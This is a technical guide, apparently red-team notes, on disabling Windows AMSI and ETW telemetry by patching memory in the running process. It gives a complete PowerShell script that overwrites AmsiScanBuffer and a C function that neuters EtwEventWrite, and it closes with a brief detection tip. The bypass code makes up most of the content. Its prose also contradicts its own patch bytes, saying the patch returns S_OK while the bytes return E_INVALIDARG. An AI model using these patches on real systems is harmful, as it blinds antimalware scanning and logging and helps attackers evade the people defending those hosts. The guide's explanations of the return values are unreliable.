# 🧩 AMSI & ETW In-Memory Patching Mechanics

The Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW) are primary telemetry feeds utilized by Windows Defender and endpoint security sensors to inspect PowerShell scripts, .NET assemblies, and WMI invocations at runtime.

---

### How AMSI Operates in PowerShell

```text
[User inputs obfuscated PowerShell string]
               │
               ▼
[PowerShell.exe runtime de-obfuscates script in memory]
               │
               ▼  Calls AmsiScanBuffer(buffer, length, appName, session, result)
[amsi.dll (In-Process)]
               │
               ▼  IPC via RPC
[MsMpEng.exe (Windows Defender Engine)]
               │
               ▼  Evaluates Buffer Signatures
               │
    [Result: AMSI_RESULT_DETECTED (32768)] ===> Execution Blocked!
```

---

### In-Memory Patching of `AmsiScanBuffer`

#### Vulnerability Logic
Because `amsi.dll` is loaded into the **same virtual address space** as the executing PowerShell process, the process owner has permission (via `VirtualProtect`) to modify the permissions of the memory page containing `AmsiScanBuffer` and overwrite the function's entry instructions.

Overwriting the entry point with an instruction that immediately returns `S_OK` (code `0x0`) and sets the scan result to `AMSI_RESULT_CLEAN` (`0x0`) forces AMSI to declare every script clean before sending it to the scanning engine.

#### PowerShell Memory Patch Example

```powershell
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
# Assembly disassembly:
#   mov eax, 0x80070057  ; E_INVALIDARG (forces AMSI to error out cleanly)
#   ret

$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Native {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32

$AmsiDll = [Native]::LoadLibrary("amsi.dll")
$ScanAddr = [Native]::GetProcAddress($AmsiDll, "AmsiScanBuffer")

$OldProtect = 0
[Native]::VirtualProtect($ScanAddr, [UIntPtr]::new($Patch.Length), 0x40, [ref]$OldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $ScanAddr, $Patch.Length)
[Native]::VirtualProtect($ScanAddr, [UIntPtr]::new($Patch.Length), $OldProtect, [ref]$OldProtect)

Write-Host "[+] AMSI in-memory patch applied successfully." -ForegroundColor Green
```

---

### Disabling Event Tracing for Windows (ETW)

Similarly, .NET execution logs assembly loads (`Assembly.Load`) to ETW via `EtwEventWrite`. By patching the entry point of `ntdll!EtwEventWrite` with a return opcode (`0xC3`), the process drops all ETW event generation silently.

```c
// C demonstration of patching EtwEventWrite in ntdll.dll
#include <windows.h>
#include <stdio.h>

void PatchETW() {
    DWORD oldProtect;
    void* pEtwEventWrite = (void*)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    
    // Make page writable
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    
    // Write RET instruction (0xC3)
    memcpy(pEtwEventWrite, "\xC3", 1);
    
    // Restore page protection
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
    printf("[+] ETW telemetry successfully neutralized for current process.\n");
}
```

---

### Defensive Detection Strategies

> [!TIP]
> 1. **Kernel-Level Detection**: Microsoft Defender now inspects process memory for known AMSI patch patterns (`0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3`) and alerts on memory write operations directed at `amsi.dll` or `ntdll.dll`.
> 2. **Script Block Logging**: Enable **PowerShell Script Block Logging** (Event ID 4104) and **Module Logging** (Event ID 4103). Even if AMSI is patched, Script Block Logging captures code before AMSI evaluation.
